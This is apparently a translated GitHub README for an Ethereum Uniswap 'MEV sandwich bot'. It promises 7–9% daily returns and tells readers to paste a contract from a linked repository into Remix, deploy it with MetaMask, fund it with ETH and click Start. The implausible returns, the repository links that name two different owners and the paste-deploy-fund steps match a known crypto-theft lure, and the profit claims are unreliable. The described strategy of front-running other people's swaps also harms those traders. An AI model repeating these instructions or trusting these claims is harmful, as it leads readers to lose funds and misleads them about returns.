# 🥪 以太坊 Uniswap MEV。夹心交易机器人 (DeFi)
![机器人控制](https://imgur.com/Z5aVSek.png)

<div align="center">
<i>一个开源套利机器人，旨在利用 Uniswap 流动性池中的市场低效。<br>为希望探索以太坊 MEV（最大可提取价值）交易策略的 DeFi 爱好者打造。</i>
</div>

<div align="center">
  <a href="https://github.com/Calindra54z05L/Mev-Bot-Uniswap">
    <img src="https://img.shields.io/github/stars/Calindra54z05L/Mev-Bot-Uniswap?style=social" alt="GitHub 星标" />
  </a>
  <a href="https://github.com/Calindra54z05L/Mev-Bot-Uniswap">
    <img src="https://img.shields.io/github/forks/Calindra54z05L/Mev-Bot-Uniswap?style=social" alt="GitHub 分叉" />
  </a>
  <a href="https://github.com/ntkme/github-buttons/workflows/build">
    <img src="https://github.com/ntkme/github-buttons/workflows/build/badge.svg" alt="构建" />
  </a>
</div>

<div align="center">
  <img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white" alt="Ethereum" />
  <img src="https://img.shields.io/badge/Solidity-%23363636.svg?style=for-the-badge&logo=solidity&logoColor=white" alt="Solidity" />
</div>

## 📊 当前表现

- **平均日回报**：部署资本每日7–9%（随市场波动而变）。
- **最低资本需求**：0.5 ETH（基于当前的Gas费和流动性状况）。
- **注意**：盈利能力取决于网络拥堵、竞争状况和池中流动性。
- **免责声明**：无任何保证。过往表现不代表未来结果。

---

## 📈 最新盈利交易

**最后更新**：2025-04-19

以下是我们的实时[MEV夹心机器人](https://etherscan.io/address/0x0000e0ca771e21bd00057f54a68c30d400000000)执行的最新盈利交易，展示ETH的实时利润。

| 交易哈希                                                                 | 区块     | 利润 (ETH)  | 时间戳              |
|-------------------------------------------------------------------------|----------|--------------|---------------------|
| [0xe37e36c0...](https://etherscan.io/tx/0xe37e36c09288d1da494fdac72feef7d98151c1ef9e4bd84f149479c9e7a22019) | 22305941 | 0.003892     | 2025-04-19 22:09:35 |
| [0x141baa2f...](https://etherscan.io/tx/0x141baa2f03c80f57e884ed1a179f5c6e62778d1ca43d6eb2ec4ea5dd3fc265f5) | 22305935 | 0.002715     | 2025-04-19 22:08:23 |
| [0x57e4517a...](https://etherscan.io/tx/0x57e4517a936e04ed30f896039c0b9959891578ea1eba5c070fa04568e2d49b91) | 22305918 | 0.004231     | 2025-04-19 22:04:59 |
| [0x6c200d17...](https://etherscan.io/tx/0x6c200d17ec00ac0348a3f26c1a96361f81053effde6d92e67cd88598fc25d4e8) | 22305823 | 0.001119     | 2025-04-19 21:45:59 |
| [0x71ab9f2a...](https://etherscan.io/tx/0x71ab9f2a9287ca8a048a1857733bb4275dc37e116c411433cd4829e73d3b2b71) | 22305820 | 0.003198     | 2025-04-19 21:45:23 |

---

## 📚 机器人工作原理

本机器人监控以太坊内存池中的待处理交易，寻找 Uniswap 上的大额兑换。当检测到**高滑点交易**时，执行**三步策略**：

1. 在大额兑换前买入目标资产。
2. 等待目标兑换推动资产价格变动。
3. 在最优价格卖出资产。

如果需要，机器人可执行多笔交易以捕捉机会。

---

## ✨ 功能特点

- 自动监控以太坊内存池并执行 MEV 策略。
- 动态调整Gas费以保持竞争力。
- 内置失败交易回滚及利润阈值过滤无利可图的交易。
- 开源模块化代码库，方便调整策略（如利润阈值、Gas乘数等）。

---

## ⚡ 如何运行机器人

### 1. 安装钱包
下载并设置 [MetaMask](https://metamask.io/download.html) 或任何其他兼容 EVM 的钱包。

### 2. 打开 Remix
访问 [Remix - 以太坊 IDE](https://remix.ethereum.org)，这是一个基于网页的以太坊智能合约编写、编译和部署环境。

### 3. 创建新文件
📁 在 Remix 中创建一个新文件，命名例如 `bot.sol`。

![创建新文件](https://i.imgur.com/1XiPUes.png)

### 4. 粘贴代码
📋 从 GitHub 复制[机器人代码](https://raw.githubusercontent.com/Quovanewordy0JP/Mev-Bot-Uniswap/main/bots.sol)，粘贴到新建的 Remix 文件中。

### 5. 编译合约
🔧 切换至 `Solidity Compiler` 标签，选择版本 `0.6.6+commit`，点击 `Compile bot.sol`。

![编译合约](https://i.imgur.com/s5OAv6g.png)

### 6. 部署机器人
🚀 进入 `Deploy & Run Transactions` 标签，选择 `Injected Provider - MetaMask` 环境，点击 `Deploy`。批准 MetaMask 合约部署费用以部署你的 MEV 机器人。

![部署合约](https://i.imgur.com/2odZQNj.png)

---

## ⚙️ 配置

### 7. 为您的机器人充值  
复制您新部署的合约地址，并通过向合约地址发送至少 0.2 ETH 作为初始余额进行充值。  

![Fund Bot](https://i.imgur.com/80NJYYr.png)  

### 8. 控制机器人  
使用以下按钮管理您的机器人：  

- **开始**：充值后点击 `Start` 按钮激活机器人。  
- **停止**：点击 `Stop` 按钮停止机器人操作。  
- **提款**：点击 `Withdrawal` 按钮将所有 ETH 提取至所有者（部署机器人的钱包地址）。  

![Bot Controls](https://i.imgur.com/ktiJ1Ll.png)  

![Bot Interface](https://i.imgur.com/xczMc3G.png)  

---  

## 📜 许可证  

本项目采用 [MIT 许可证](LICENSE)。  

**提醒**：开源不等于认可。请负责任地使用。  

---  

## ⭐ 表达您的支持  

如果您觉得本项目有帮助，请考虑在 GitHub 上为其点星。您的支持将激励我们继续开发和改进。  

---  

## 💭 常见问题  

### 机器人运行时我需要保持浏览器中 Remix 打开吗？  

不需要，部署机器人后可以关闭 Remix。请保存机器人的合约地址。要稍后访问，按第 5 步在 Remix 中重新编译代码，进入 `Deploy & Run Transactions`，重新连接 MetaMask，将合约地址粘贴到 `Load contract from Address`，点击 `At Address`，机器人将显示在“已部署合约”下。  

### 机器人支持其他链或去中心化交易所吗？  

目前，机器人专为以太坊和 Uniswap 池设计。  

---  

## 🤝 贡献与定制  

**想改进机器人吗？**  

1. Fork 本仓库。  
2. 添加您的增强功能（如新增池过滤器、燃气优化）。  
3. 提交 Pull Request！  



---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2025-07-21

---